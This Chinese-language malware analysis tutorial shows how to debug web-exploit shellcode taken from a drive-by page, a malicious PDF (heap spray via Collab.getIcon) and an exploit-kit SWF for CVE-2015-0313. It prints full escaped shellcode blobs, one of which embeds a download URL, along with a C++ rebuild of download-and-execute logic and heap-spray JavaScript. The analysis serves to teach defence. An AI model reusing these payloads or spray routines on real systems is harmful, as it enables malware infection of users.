# IE安全系列：脚本先锋（IV）—网马中的Shellcode

脚本先锋系列第四章，也是最后一章。将介绍对Shellcode的调试，以及SWF、PDF漏洞的利用文件的简单处理过程。

下一部分预告：

**_IE安全系列：中流砥柱（I） — JScript 5 解释器处理基本类型、函数等的简单介绍_**

IE中使用的Javascript解析器经历了多年的磨练，终于在版本5处分成了两个大版本，5之后的9，二者的关联和对一些内容的处理方式的不同之处，这两篇中，第一篇将对Jscript 5.8引擎中的字处理、函数调用等做简单的介绍。

**_IE安全系列：中流砥柱（II） — JScript 9（Charka）编译后字节码的简单介绍_**

多年磨练之后，Jscript 9的性能得到了很大的提升，9和5处理起一些基本类型数据的区别会在这篇简要叙述，这篇会有和（I）类似的介绍，只不过是针对Charka的脚本流程的。 （这个成语，我想大概也能这么用吧……）

VI.1 调试Shellcode
=====

上一篇（V.2）中，我们留下了一个全篇使用XOR 0xE2加密的Shellcode，这篇中，我们将使用调试工具解密它。

escape 之后的SHELLCODE如下：

```
%u0C0C%u6090%u1CEB%u4B5B%uC933%uB966%u03F8%u3B81%u0BFF%uE160%u850F%u0254%u0000%u3480%uE20B%uFAE2%u05EB%uDFE8%uFFFF%u0BFF%uE160%uE2E2%u86BD%uD243%uE2E2%u69E2%uEEA2%u9269%u4FFE%u8A69%u69EA%u8815%uBBED%uC00A%uE2E1%u72E2%u1A00%uD18A%uE2D0%u8AE2%u91B7%u9087%u69B6%uEEA4%u720A%uE2E0%u69E2%u880A%uBBE3%uE00A%uE2E1%u00E2%u8A1B%u8C8D%uE2E2%u978A%u8E90%uB68F%uF41D%u2267%uF197%u8D8A%uE28C%u8AE2%u9097%u8F8E%u69B6%uEEA4%u820A%uE2E0%u69E2%u880A%uBBE3%u300A%uE2E0%u00E2%u8A1B%uD18E%uE2D0%u918A%u878A%uB68E%uA469%u0AEE%uE0A3%uE2E2%u0A69%uE388%u0ABB%uE051%uE2E2%u1B00%u0E63%uE3E2%uE2E2%u3E69%u2163%uE262%uE2E2%uE288%uF888%u88B1%u1DE2%uA6B4%u22D1%u62A2%uE1DE%u97E2%u6B1B%u7264%uE2E2%u25E2%uE1E6%u83BE%u87CC%uA625%uE6E1%u879A%uE2E2%u2BD1%uB3B3%uB5B1%uD1B3%u6922%uA2A4%u0C0A%uE2E3%u61E2%uE21A%u67ED%uE37E%uE2E2%uE288%uE288%uE188%uE288%uE088%uE28A%uE2E2%uB122%uA469%u0AC6%uE32F%uE2E2%u1A61%uED1D%u9966%uE2E3%u6BE2%u82A4%uE288%u1DB2%uCAB4%uA46B%u6986%u7264%uE2E2%u25E2%uE1E6%u80BE%u87CC%uA625%uE6E1%u879A%uE2E2%uE288%uE288%uE088%uE288%uE288%uE28A%uE2E2%uB1A2%uA469%u0AC6%uE369%uE2E2%u1A61%uED1D%uDB66%uE2E3%u6BE2%u6664%uE2E2%u6BE2%u6E7C%uE2E2%u69E2%u82A4%uE288%uE288%uE288%uA469%uB282%uB41D%u25DA%u92A4%uE2E2%uE2E2%uA425%uE296%uE2E2%u63E2%uE225%uE2E0%uD1E2%u6939%u86BC%uE288%uA46F%uB292%uE28A%uE2E6%uB5E2%u941D%u1D82%uE6B4%u2BD1%uE25B%uE2E6%u62E2%uED9E%u771D%uEE96%u9E62%u1DED%u96E2%u62E7%uED96%u771D%u0900%u2169%uE2CF%uE2E6%u61E2%uE21A%uE19D%uBC6B%u8892%u6FE2%u96A4%u1DB2%u9294%u1DB5%u6654%uE2E2%u1DE2%uD2B4%u0963%uE6E2%uE2E2%u1961%u9DE2%u1D47%u8294%uB41D%u1DD6%u6654%uE2E2%u1DE2%uD6B4%u6469%uE272%uE2E2%u7C69%uE26E%uE2E2%uE625%uBEE1%uCC83%uB187%uB41D%u69CE%u6E5C%uE2E2%u69E2%u7264%uE2E2%u25E2%uE5E6%u80BE%u87CC%u0E63%uE3E2%uE2E2%u3E69%uE28A%uE2E3%uB1E2%uE28A%uE2E3%uB5E2%uE288%uE288%uB41D%u69FE%uD119%uD122%u6339%uE20E%uE2E0%u69E2%u612E%uB61A%uEA9F%uFE6B%u61E3%uE622%u1109%u2E69%u3B69%u2161%uD1F2%uB222%uB1B3%uB2B2%uB2B2%uB2B2%uB2B5%u69B2%uEAA4%u650A%uE2E2%u63E2%uFA26%uE2E6%u83E2%uA425%uE1F6%uE2E2%uD1E2%u692B%uC6DE%u0D61%u6194%uEA26%u2BD1%u051D%uE288%uB41D%u86F6%uD243%uE2E2%u69E2%uEEA2%u9269%u4FFE%u8A69%u69EA%u6B15%u86B4%uE688%u0ABB%uE241%uE2E2%u0072%u8A1A%uD0D1%uE2E2%uB78A%u8791%uB690%uE469%uF00A%uE2E2%u69E2%u880A%uBBE7%u660A%uE2E2%u00E2%uD11B%uB51D%uB41D%u62E6%u0ADA%uDA62%u970B%u63F3%uE79A%u7272%u7272%uEA96%u1D69%u69B7%u6F0E%uE7A2%u021D%uDA0A%uE2E2%u21E2%uDA62%u620A%u0BDA%uF397%u9A63%u72E7%u7272%u9672%u8A05%uE8EA%uE2E2%uA26F%u1DE7%u0A02%uE2F5%uE2E2%u0A21%uE2F3%uE2E2%uF35A%uE6E3%u2062%uE2EE%uE009%u21BA%u1B0A%u1D1D%uB91D%uE524%u6B5A%uE3BD%u2584%uE7A5%u021D%uB121%u3E69%u88B1%u8AA2%uF2E2%uE2E2%u69B5%uC2A4%u640A%u1D1D%uBA1D%uB321%u69B4%uDE97%u9669%u9ACC%u17E1%u69B4%uC294%u17E1%u2BD1%uA3AB%uE14F%uD127%uED39%uF25C%u34D8%uEA96%u2923%uE1E5%uA238%u1309%uFDD9%u0597%u69BC%uC6BC%u3FE1%u6984%uA9EE%uBC69%uE1FE%u693F%u69E6%u27E1%uBC49%u21BB%u9B0A%u1D1E%u501D%u0010%u5016%uEDD4%u12F1%u99AA%uD0DF%u7396%u67EE%u4D3D%u8159%u336B%uB3AD%u58A2%uE59D%uC070%uFC92%u8646%u710D%u06D0%u6C76%uE8F1%u9B4E%u04DB%u267A%uFD6F%uB596%uEF84%uA11D%u4E5C%u7A39%uF2E8%u621A%u4D34%u1978%uF7B1%u8A84%u9696%uD892%uCDCD%u8083%uCC8C%u8C86%uD291%uD7D5%uCCD7%u878C%uCD96%uCD86%u8686%uCC86%u9A87%uE287%uE2E2

```

将这些Shellcode放到EXE根部，组成一个EXE，见参考资料(1]附件。

![enter image description here](http://drops.javaweb.org/uploads/images/e9137a74e6edd55d633e0188d599b47602821f5f.jpg)

警告 如果你直接解压这个程序，你的杀毒软件可能会报警。这是因为该Shellcode已经被多个杀毒软件作为特征入库。请在虚拟环境执行，或者暂时关闭杀毒软件。

![enter image description here](http://drops.javaweb.org/uploads/images/bc8f4c4ceda739143bb2372a057bc145916420fb.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/fefc2a3db555458035db20ba0f6fd6b098652986.jpg)

`CALL 405006`调用时，会将其下一条指令的地址压栈，因此`00405006`处的`POP EBX`其实获取到的就是下一条指令的地址。

之后`ECX = 0x3F8`的语句其实就是为了告诉下面的LOOP指令要循环多少`（0x3f8）`次，这也是加密后的字符串长度。

![enter image description here](http://drops.javaweb.org/uploads/images/85db7272b8f0f4b770affa69cfb21d81fafeef47.jpg)

然后，下一句意义其实不大，只是为了确保要解密的内容对不对，

![enter image description here](http://drops.javaweb.org/uploads/images/106116b004560b564933aa377bd5af5013dabd85.jpg)

紧接着是一个JNZ指令，可以看到OllyDbg之前发生了解析错误。OD解析为了DB、TEST、DB三条不伦不类的数据+指令的结合，对比IDA的结果可以知道这里是一个JNZ，实际上跟着CMP，这里十有八九也是跳转指令。

![enter image description here](http://drops.javaweb.org/uploads/images/7f79236747233a46a395a1d23f875510a2b37f33.jpg)

选中三行，右键选择analysis - remove analysis from selection，这时就可以恢复正常的语句。

![enter image description here](http://drops.javaweb.org/uploads/images/ea73e019e98bcd9fc4eb9bdebed89fab93ee15ed.jpg)

接下来的XOR+LOOP则就是经典的“加密/解密”，一大牛也戏称中国三大加密算法之一的异或解密。解密密钥很明显就是0xe2了。

在LOOP下一行下断点，可以得到解密后的内容，此时OD还是解析有误，我们手动选择`0x5033-0x3f8`左右的内容，重复remove analysis的过程即可得到基本正确的代码：

![enter image description here](http://drops.javaweb.org/uploads/images/9f9352de9c79e60e2ddeae3e203596b4fe368c5a.jpg)

处理后：

![enter image description here](http://drops.javaweb.org/uploads/images/248cf33df05612b774d06e7d950ed9d512c25198.jpg)

`4053AE`处仍然是一个CALL，会回到`40502C`处，上图中JMP的下一行。为什么这么做大家应该很容易理解，和之前一样，`4053AE`之后的一句很可能就是常量值了，而且`40502C`处也有`POP EDI`的语句。

![enter image description here](http://drops.javaweb.org/uploads/images/20870943d74e6640f51ee0b2a16bce8608ce0972.jpg)

由于之前我们remove analysis比较多，导致了后面的常量也被当作了代码，这个很容易就能发现，因为里面出现了大量的不明所以的代码：

![enter image description here](http://drops.javaweb.org/uploads/images/42bba05de37a9295b42cd6bdbc1c239ee302313e.jpg)

右键中选择Analysis code即可重新分析这块：

![enter image description here](http://drops.javaweb.org/uploads/images/316c110ce8f13430227479abfc9449990e374432.jpg)

我们假装什么都没看见，继续调试这段代码。

![enter image description here](http://drops.javaweb.org/uploads/images/9f4ed9608b3b0370f2f3ef74d2298fda43ae29a7.jpg)

30、0c、1c、8，这些令人熟悉的数字（不记得了请看上篇最后），可以肯定的知道这里就是在获取某个函数地址，其实就是LoadLibrary了，这个肯定是各个Shellcode第一个要做的事情，要不然后续如何开展呢:)。

`405369`的CALL即会获取所需的函数地址。比较字符串可能会用掉较多的空间，所以这里它采用了给函数名取HASH的方式：

![enter image description here](http://drops.javaweb.org/uploads/images/35935306de345294995be53dc95868ad322b14a0.jpg)

即伪代码如下：

```
DWORD dwHash;
CHAR chFuncName;
while(chFuncName = szWindowsAPIName++)
{
dwHash += chFuncName;
_ROR(dwHash, 7);
}

```

在函数名这种大概一个模块就几百个的东西里面，这个HASH算法还是可以做到粗略的准确的，

![enter image description here](http://drops.javaweb.org/uploads/images/01398f4e116e7e2189461be19f4336986565bb0d.jpg)

此例中，在这附近就是存着的他们想要拿到的函数的HASH，获取到函数地址之后会覆盖掉对应的Hash，可见空间用的还是比较紧凑的：

![enter image description here](http://drops.javaweb.org/uploads/images/d822b16c29afa9ad28f1c8509e0a6860816eafbb.jpg)

之后就是简单的函数跟踪了，有兴趣的话可以自己跟踪一下，之后该Shellcode的动作我直接写成C++代码了，供参考，获取函数地址的细节代码我就跳过不写了，不保证可编译，不过如果要编译的话简单修改应该就可以了：

```
HMODULE hModule = LoadLibraryA(“User32”);
GetAddressFromModule(hModule, “GetModuleHandleA”); //自己获取函数地址的函数，没用系统的GetProcAddress，估计为了省字符串的长度，这里事实上还是用的Hash，为了方便阅读这么写了

if(GetModuleHandleA(“urlmon”) == NULL)
{
    hModule = LoadLibrary(“urlmon”);
}
GetAddressFromModule(hModule, “URLDownloadToFileA”);

hModule = LoadLibraryA(“shell32”);
GetAddressFromModule(hModule, “SHGetSpecialFolderPathA”);

CHAR buffer[MAX_PATH];
SHGetSpecialFolderPathA(0, buffer, 0x1a, 0);  //APPDATA

strcat(buffer + strlen(buffer), “\a.exe”);

do
{
    if (URLDownloadToFileA(0, MALICIOUS_URL, buffer, 0, 0) == S_OK)
    {
    //这个URL访问不了了，所以必然不是S_OK，执行完以后手动置EAX为0，然后随便拷贝个EXE去%appdata%\a.exe吧，要不然后面调试起来会比较蛋疼
        HANDLE hFile = CreateFileA(buffer, 0xc0000000, 2, 0, 3, 0, 0 );
             if(hFile != INVALID_HANDLE)
        {
            DWORD dwFileSizeLo = GetFileSize(hFile, 0);
            CHAR buffer_otherone[1024];
            buffer[strlen(buffer) - 5] = ‘b’; //实际上操作语句不是这样，不过最后结果一样，简单写好了
            HANDLE hFile2 = CreateFileA(buffer, 0x40000000, 0, 0, 2, 0, 0);
            if(hFile2 == INVALID_HANDLE) break;
            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
            DWORD dwPos = 0;
            while(dwPos < dwFileSizeLo)
            {
                ReadFile(hFile, buffer_otherone, 1024, dwBytesRead, NULL);
                dwPos += 1024;
                for(int i=0; i<1024; ++i)
                {
                    if(buffer_otherone[i] != 0 && buffer_otherone[i] != 0x95)
                        buffer_otherone[i] ^= 0x95;
                }
                //事实上木马下载回来的文件是0x95异或过的，只是为了防杀，所以这里为了保证它能正常运行，还需要这一步给它解回来
                WriteFile(hFile2, buffer_otherone, 1024, 0, 0);
            }
            CloseHandle(hFile);
            CloseHandle(hFile2);
            buffer[strlen(buffer) - 5] = ‘a’; //实际上操作语句不是这样，不过最后结果一样，简单写好了
            DeleteFileA(buffer);
            buffer[strlen(buffer) - 5] = ‘b’; 
            WCHAR bufferw[256];
            MultiByteToWideChar(buffer, CP_ACP, 0, buffer, 256, bufferw,  256);
            CreateProcessInternalW(0,0, bufferw, 0, 0, 0, 0); //启动木马
        }
    }
}while(0);

ExitProcess(0);

```

MALICIOUS_URL就这玩意，不贴上来了，要不白送别人一个友情链接多不好：

![enter image description here](http://drops.javaweb.org/uploads/images/4c8feec39c81d465ae77954c839bb228ac9e904b.jpg)

VI.2 Shellcode in PDF
=====

Adobe PDF Reader是一个全球内都广泛使用的工具，而它又可以在IE中实例化，因此，PDF漏洞也是攻击者热衷于挖掘和利用的一个重要部分，而PDF中也允许Javascript的执行，这就更加剧了其安全问题，本节将简单介绍如何提取PDF中的Shellcode。

关于PDF结构的细节不在这里过多介绍，以下是一个PDF的很常见的形式，PDF有明显的“节”（x x obj）和“节”信息（用双尖括号包围），而为了控制PDF的大小，PDF是支持多种压缩方式的，一种方式是zlib算法的压缩，这种方式压缩的节显示如下，可以从FlateDecode来区分出来。

在stream-endstream之间的就是压缩后的内容，还有个特征是这段内容的第一个字是“x”。

![enter image description here](http://drops.javaweb.org/uploads/images/ee9b8c04c0b1783500d1b96835b7e4620361ff4e.jpg)

当然，PDF也是支持明文存放的甚至于直接内部执行JS，例如：

![enter image description here](http://drops.javaweb.org/uploads/images/7dddcfd12b3e241c7fbfa22e990df666d3c19f06.jpg)

`16 0 obj - endobj`中间的就是js脚本。

针对PDF的解析可以参考我之前放出来的Redoce工具，可以针对性地对压缩过的部分进行解压，例如图中这节压缩内容解压后明显是垃圾信息，因此可以跳过：

![enter image description here](http://drops.javaweb.org/uploads/images/aba01743707915626721f3d016f4fc3cf748ea7f.jpg)

附件中的例子有恶意代码的部分是明文存放的，因此要对它的代码进行阅读和Shellcode的抽取应该是相当简单的。

![enter image description here](http://drops.javaweb.org/uploads/images/d19d29f8487c54e7abb365edb74ec3725326955d.jpg)

还有一点是PDF中的JS并不是多“标准”，有个明显的特征是它的内容会经过一层编码，例如上图\全部被编码成了\，工具可以做简单清理，如上图所示。

其实清理之后，留下来了很多\”，虽然不会产生语法错误，不过看起来还是很别扭，也可以手动再把这些\都删掉。还有开头的例如(?function ...需要手动删除成(function ...。

清理完的代码见附件malicious_VI.rar 的 pdf.js.txt。

简单地阅读一下代码，虽说一眼就能看出来awn5fmmtY 这个变量就是Shellcode，和、至少是它的绝大部分，但是还是看一看吧：

![enter image description here](http://drops.javaweb.org/uploads/images/7cb450879d7a22f11a1d89400a0ea241870b114f.jpg)

一番阅读之后，可以发现这里使用了`app[’eval’](xxxx)`，正如你所见，不是他替换了什么东西，而是PDF中的eval函数实际上是属于app对象的，而不是window对象。具体可以参照参考资料[2](http://drops.wooyun.org/wp-content/uploads/2015/06/image0033.png)，Adobe的开发资料。

![enter image description here](http://drops.javaweb.org/uploads/images/5cc7365c51fa02d29b275b152a0fd64a3f039d32.jpg)

最终执行的就是这么一段

![enter image description here](http://drops.javaweb.org/uploads/images/4aa96f97442f1ed0a846ec93dc474dc33a0ae557.jpg)

为了不让图太大，我把字号缩小了，具体可参照附件。

这一段中，采用了`awn5fmmtY = unescape(awn5fmmtY.join(""));`的方式将这个Array输出成一个字符串。然后就是简单的堆喷过程，

![enter image description here](http://drops.javaweb.org/uploads/images/6d0e7aa71ee5e1012fab239d641a4dbb4a23715d.jpg)

我们手动改一下变量就能看的很清楚了：

```
var fK2iJohU = 0x400000;
var mTcRGdIAFp = awn5fmmtY.length * 2;
var kIkwRkWL = fK2iJohU - (mTcRGdIAFp + 0x38);
var sR4ZJ8w7ci = unescape("%u9090%u9090");
sR4ZJ8w7ci = xZltXdRrA(sR4ZJ8w7ci, kIkwRkWL);
var lFu82BhUm = (h8qcONPj - 0x400000) / fK2iJohU;
for(var ho7zfzSpA2 = 0; ho7zfzSpA2 < lFu82BhUm; ho7zfzSpA2++)
{
    rTq8VBM7[ho7zfzSpA2] = sR4ZJ8w7ci + awn5fmmtY;
}

```

改为方便人阅读的代码就是：

```
var  arr = new Array();
var  blockSize = 0x400000;
var  shellcodeSize = shellcode.length * 2;
var  spraySize =  blockSize - (shellcodeSize + 0x38);
var  nops = unescape("%u9090%u9090");
nops = extendStrForXXTimes(nops, spraySize);
var sprayTarget = 0x0c0c0c0c;
var  fillTimes = (sprayTarget - 0x400000) / blockSize;
for(var i = 0; i < fillTimes; i++)
{
  arr[i] = nops + shellcode;
}

```

如何，上述代码是否非常眼熟？对了，随便找一个堆喷的js代码都是如此。这个PDF实际上是利用了PDF的`app.doc.Collab.getIcon()`函数的溢出漏洞，该函数没有对文件名长度进行检查，直接拷贝进了缓冲区，是一个经典的溢出漏洞。利用时文件名需要加上特定的表示，例如下图中N.doc，否则无法走入有漏洞的部分。Adobe JavaScript中使用堆喷在当时效果非常稳定：

![enter image description here](http://drops.javaweb.org/uploads/images/1cb58491ddc068e18f037f0ec5036a1acf7f1fef.jpg)

具体细节网上有分析过程，在此不提了，Shellcode可以简单看一下。

提取出来的shellcode如下：

```
%u5350%u5251%u5756%u9c55%u00e8%u0000%u5d00%ued83%u310d%u64c0%u4003%u7830%u8b0c%u0c40%u708b%uad1c%u408b%ueb08%u8b09%u3440%u408d%u8b7c%u3c40%u5756%u5ebe%u0001%u0100%ubfee%u014e%u0000%uef01%ud6e8%u0001%u5f00%u895e%u81ea%u5ec2%u0001%u5200%u8068%u0000%uff00%u4e95%u0001%u8900%u81ea%u5ec2%u0001%u3100%u01f6%u8ac2%u359c%u0263%u0000%ufb80%u7400%u8806%u321c%ueb46%uc6ee%u3204%u8900%u81ea%u45c2%u0002%u5200%u95ff%u0152%u0000%uea89%uc281%u0250%u0000%u5052%u95ff%u0156%u0000%u006a%u006a%uea89%uc281%u015e%u0000%u8952%u81ea%u78c2%u0002%u5200%u006a%ud0ff%u056a%uea89%uc281%u015e%u0000%uff52%u5a95%u0001%u8900%u81ea%u5ec2%u0001%u5200%u8068%u0000%uff00%u4e95%u0001%u8900%u81ea%u5ec2%u0001%u3100%u01f6%u8ac2%u359c%u026e%u0000%ufb80%u7400%u8806%u321c%ueb46%uc6ee%u3204%u8900%u81ea%u45c2%u0002%u5200%u95ff%u0152%u0000%uea89%uc281%u0250%u0000%u5052%u95ff%u0156%u0000%u006a%u006a%uea89%uc281%u015e%u0000%u8952%u81ea%ua6c2%u0002%u5200%u006a%ud0ff%u056a%uea89%uc281%u015e%u0000%uff52%u5a95%u0001%u9d00%u5f5d%u5a5e%u5b59%uc358%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u6547%u5474%u6d65%u5070%u7461%u4168%u4c00%u616f%u4c64%u6269%u6172%u7972%u0041%u6547%u5074%u6f72%u4163%u6464%u6572%u7373%u5700%u6e69%u7845%u6365%ubb00%uf289%uf789%uc030%u75ae%u29fd%u89f7%u31f9%ubec0%u003c%u0000%ub503%u021b%u0000%uad66%u8503%u021b%u0000%u708b%u8378%u1cc6%ub503%u021b%u0000%ubd8d%u021f%u0000%u03ad%u1b85%u0002%uab00%u03ad%u1b85%u0002%u5000%uadab%u8503%u021b%u0000%u5eab%udb31%u56ad%u8503%u021b%u0000%uc689%ud789%ufc51%ua6f3%u7459%u5e04%ueb43%u5ee9%ud193%u03e0%u2785%u0002%u3100%u96f6%uad66%ue0c1%u0302%u1f85%u0002%u8900%uadc6%u8503%u021b%u0000%uebc3%u0010%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u8900%u1b85%u0002%u5600%ue857%uff58%uffff%u5e5f%u01ab%u80ce%ubb3e%u0274%uedeb%u55c3%u4c52%u4f4d%u2e4e%u4c44%u004c%u5255%u444c%u776f%u6c6e%u616f%u5464%u466f%u6c69%u4165%u7500%u6470%u7461%u2e65%u7865%u0065%u7263%u7361%u2e68%u6870%u0070%u7468%u7074%u2f3a%u692f%u6b6e%u616b%u2e6b%u6e63%u652f%u746e%u7265%u752f%u6470%u7461%u2e65%u6870%u3f70%u6469%u333d%u7226%u7465%u6f3d%u006b%u9000

```

![enter image description here](http://drops.javaweb.org/uploads/images/d4834b508878b3ab551a1a60f845959e3f1220db.jpg)

通过简单处理可以看到就是简单的`URLDownloadToFile`，由于这里`%u0000`不会影响流程，所以支持带0的shellcode使得它的体积缩小了很多。简单调试一下吧。将shellcode附着到exe之后（附件malicious2.exe.txt）。

代码十分简单：

![enter image description here](http://drops.javaweb.org/uploads/images/2fdfbbcc9f8a5012308ad58ffa3bbf0ee70a29eb.jpg)

首先PUSHAD PUSHFD，然后使用POP EBP，SUB EBP,0D来构造一个栈帧。

![enter image description here](http://drops.javaweb.org/uploads/images/8f6dbc9353dd6f7be72a6112bc163ce95d9f23ac.jpg)

接着又是常见的fs:30、0c、1c、8、34这些常见的值，后面的内容不言自明，我们可以锻炼一下静态阅读，具体动作如下：

![enter image description here](http://drops.javaweb.org/uploads/images/b9fde58d3540b9007c1d0c2261fe1b0e46a82f64.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/6b78373c150b603d54287ccc87a82d0320beb3ea.jpg)

也即跟着查找GetTempPathA（ebp+15e）等等函数的地址并保存在ebp+14e处。

然后，还是上图，就可以知道0x405053处的call实际上就是call了GetTempPathA，在此获得临时目录位置，接下来

![enter image description here](http://drops.javaweb.org/uploads/images/8758018ee1ed6bd51882c8df91f99b1885ffe3b6.jpg)

此处`LoadLibrary EBP+245`处的内容（`URLMON.dll`），然后并`GetProcAddress`获取EBP+250处的函数地址（`URLDownloadToFileA`），并最终调用`URLDownloadToFileA`，下载的文件是`EBP+278`处的URL，保存到`EBP+15E`处（`%temp%\update.exe`）：

![enter image description here](http://drops.javaweb.org/uploads/images/370103be5b2f8b82058fd00fde2c16dbee8218aa.jpg)

并在此调用EBP+15E的函数（WinExec）执行下载回来的程序：

![enter image description here](http://drops.javaweb.org/uploads/images/8f6762fabf9b2483d7f073ccc8c673a821e7de36.jpg)

然后再次获取Temp目录的地址，重复之前的步骤，只不过下载到的是`%temp%\crash.php`，并再次调用WinExec执行，`POPFD POPAD`，退出程序。

这个Shellcode的主要作用就是下载者了，因此到这里也算是完美的完成了任务了。让我们再看看它的亲戚：SWF。

VI.3 Shellcode in SWF
=====

如上一节所说，SWF凭借着目前网上最为流行的多媒体互动程序Adobe Flash Player，SWF的用户量只会比难兄难弟PDF的大而不会小，而SWF的漏洞高发，导致了SWF也称为了漏洞利用者心目中的明星。针对SWF的反编译，可以依赖于Eltima Software的Flash Decompiler Trillix，或者其他能弄成AS文件的都可以。

单从SWF自身来说，它的压缩模式常见的两种，文件头是CWS的表示使用了压缩，也是zlib算法，FWS的表示没有压缩过。

我的工具中也提供了对SWF的自动解压，由于有些网马会把URL明文存放，所以处理后还是可以方便病毒研究者来抓出URL的，如下图：

![enter image description here](http://drops.javaweb.org/uploads/images/01d2fc590f0d032b83a68c448c91fc51c8097ef4.jpg)

接下来可以阅读SWF的Action Script了，与之相关的书籍可以参考《ActionScript 3.0 Bible》，这是一本介绍十分详细的工具书，或者其他你手头可以让你迅速看懂AS的资料也可。

附件中malicous3.swf.txt是CVE-2015-0313 的利用文件，该漏洞是Flash Player的一个UAF问题，具体细节网上有很多了，这里我们还是针对SWF到AS的过程做一些解释：

使用Flash Decompiler Trillix载入该swf文件。

![enter image description here](http://drops.javaweb.org/uploads/images/d591002c0a4d2d223b3fa56df1ff74e991101fd3.jpg)

可以看到AS脚本中有三个类，这个SWF文件抓取自使用AEK ，AEK提供给别人用的东西都是高度混淆的，这里面也不例外，可见各个类的名字就已经被混淆过了。

一个小问题是AEK是漏洞工具包，或者白话点就是卖给别人用来坑其他人的软件，不是漏洞名。国内的一个软件曾经提示了AEK是漏洞，其实是不正确的，具体名字我也就不截图了：

![enter image description here](http://drops.javaweb.org/uploads/images/cf8cc1e04433aa3ddd875925b29b005ddba31980.jpg)

AS3.0中会使用Worker对象，Worker对象间也可以共享对象[3](http://drops.wooyun.org/wp-content/uploads/2015/06/image0054.png)，漏洞代码通过触发在主执行线程和worker间共享的MessageChannel属性中的漏洞来执行。主要是三步：

1.  通过setSharedProperty把一个ByteArray对象设置为共享属性
2.  把这个ByteArray设置到domainMemory中
3.  worker调用getSharedProperty获取这片内存，然后调用`ByteArray::Clear`清空它。Clear之后，domainMemory并没有将内存置空，从而导致了UAF的存在。

然后，让我们先阅读一下SWF代码：

```
In &.as：
 private static var 5:&;
 5 = new &();

```

![enter image description here](http://drops.javaweb.org/uploads/images/a375edcf60ef14d7d445473804d64f2e8552d8b4.jpg)

这里的逻辑是如此连上的，所以“5”可以看作是class “&”的实例。

由于`class &::&()`中设置了`this.4 = "BAPO6SgZH....”;`因此，

![enter image description here](http://drops.javaweb.org/uploads/images/d03d928020d93de9dd2dca9a1be1ee640351972e.jpg)

函数7()中事实上loc1的值就是经过函数’()处理后的this.4后面这一串字符了，

函数’()的定义如下：

![enter image description here](http://drops.javaweb.org/uploads/images/bc089122a6650d57fc283d18c3580c89be166b80.jpg)

不过这么看实在是太痛苦了，而且由于这个混淆使得Adobe Flash Professional CS5的着色也发生了混乱，因此让我们手动替换一下里面的值。

![enter image description here](http://drops.javaweb.org/uploads/images/babb75b0f22b43fbcbca7f2cf1bb34f31a351487.jpg)

首先简单阅读一下’()，知道它是某种解密函数，因此我直接把它换成decode()；

然后针对常量也做类似的简单阅读-替换：

![enter image description here](http://drops.javaweb.org/uploads/images/a14555cdc434fe396ee0aa84f3d73c9268905c56.jpg)

最终得到：

![enter image description here](http://drops.javaweb.org/uploads/images/9180efccfde0664e6d762e459f0e6aa2d2fd5fa4.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/fe3963ff9004982c1fe86b73db6c61912533a4e7.jpg)

这样代码看起来就要方便得多了，不用在想这一堆乱七八糟的代号是什么了。使用检查语法错误功能，检查完毕后就可以执行这段代码让它自己吐处理结果了。

![enter image description here](http://drops.javaweb.org/uploads/images/5469a9301586439942f96f5b086f7a7ae19ec702.jpg)

新建一个AS工程，把脚本粘进去。

![enter image description here](http://drops.javaweb.org/uploads/images/0e240874a622c29ca8a50d9a615b67152fd8983a.jpg)

然后在对应位置加上trace，decode返回的是类BASE64解后的结果，该SWF在这段代码：

```
while (i < myDecodedStr.length) 
{
       n = n + 1 & 255;
       loc6 = (myByteArray[n] & 255) + loc6 & 255;
       loc10 = myByteArray[n];
       myByteArray[n] = myByteArray[loc6];
       myByteArray[loc6] = loc10;
       loc9 = (myByteArray[n] & 255) + (myByteArray[loc6] & 255) & 255;
       myDecodedStr[i] = myDecodedStr[i] ^ myByteArray[loc9];
       ++i;
}

```

运行完之后输出的内容就是解密后的了，其实仔细看的话它就是个RC4。

![enter image description here](http://drops.javaweb.org/uploads/images/21e6c0e05abf52403884483a1f95ecd4afdc116b.jpg)

Ctrl+Enter后卡了小一阵子，运行得到结果：

![enter image description here](http://drops.javaweb.org/uploads/images/c95731eb39d7928761095f47a80e7a8c1aae3440.jpg)

结果输出又是一个SWF文件，真是让人头疼的事情，使用FileReference类即可（`import flash.net.FileReference;`）

![enter image description here](http://drops.javaweb.org/uploads/images/62fa8c8676c6972167927f425153f8d5c05e140b.jpg)

然后保存后的就是解密后的内容。对这个swf再做一个分析，如果Flash Decompiler一分析那个SWF就崩溃的话，这个时候可以换个其他类似工具，例如FFD

![enter image description here](http://drops.javaweb.org/uploads/images/d1913db77c42a80289f6d25cd1350c6d489b777d.jpg)

打开后可以看到类名点点杠杠的好不欢乐，AEK的加密已经丧心病狂到把它认为所有有可能威胁到自己的代码全部RC4加密放到了二进制数据中，使用时现场取出解压。

眼睛都看花了，阅读过程太过痛苦，就贴一下具体内容吧，

![enter image description here](http://drops.javaweb.org/uploads/images/a0b04078ddd73821c438a7331304706ddeeb1f64.jpg)

这里的逻辑是：如果没解密的话解一下（`if (!_a_-___-) _a-_—()`），然后把index异或处理一下，异或的值就是_a_—。

![enter image description here](http://drops.javaweb.org/uploads/images/7a2a463ef01dd28f39e21f0aaff43bfd7f3a1a7f.jpg)

这个是它的RC4加密的Key，2组密钥，16字节一组。

![enter image description here](http://drops.javaweb.org/uploads/images/8d7f11c21fea2a84088fd4d93ef4c45fed6e33d8.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/b88d076b6c88e112eed1e5cadcbb280e2410cb23.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/8d8ef27af80c843d4176605f8ac564d4aa7dd334.jpg)

最终此处做ROP并且使用Shellcode，参考资料(5]也是解了类似的SWF文件，其中的RC4解密代码大家可以借鉴一用。

![enter image description here](http://drops.javaweb.org/uploads/images/52647497ced11733a516533626f1961d2639c1f7.jpg)

解出来的Shellcode使用的代码很简单，和上一节类似，会用WinHTTP的相关函数访问网址并用XXTEA解密：

如果是Shellcode ，直接执行；

如果是DLL，下载并调用`regsvr32 /s`来注册（其实也就是启动）它。

Shellcode篇章至此结束，限于篇幅和个人能力，肯定还是有很多覆盖不到的地方，一些实战内容将在后续章节覆盖，同时，参考资料[4](http://drops.wooyun.org/wp-content/uploads/2015/06/image0072.png)中也有大量的Shellcode可供调试。

参考资料
=====

